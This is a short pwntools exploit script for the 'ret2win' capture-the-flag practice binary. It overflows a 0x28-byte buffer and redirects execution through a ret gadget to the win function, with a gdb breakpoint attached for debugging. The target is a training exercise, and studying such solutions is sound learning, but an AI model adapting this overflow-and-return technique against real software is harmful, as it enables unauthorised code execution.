from pwn import *

elf = ELF('ret2win')
p = process(elf.path)

gdb.attach(p, gdbscript='b *pwnme+107')

p.recvuntil("we're using read()!\n")

payload = b''
payload += b'a'*0x28
payload += p64(0x40053e)
payload += p64(0x400756)

p.send(payload)

p.interactive()

with open('out.txt', 'wb') as out:
    out.write(payload)
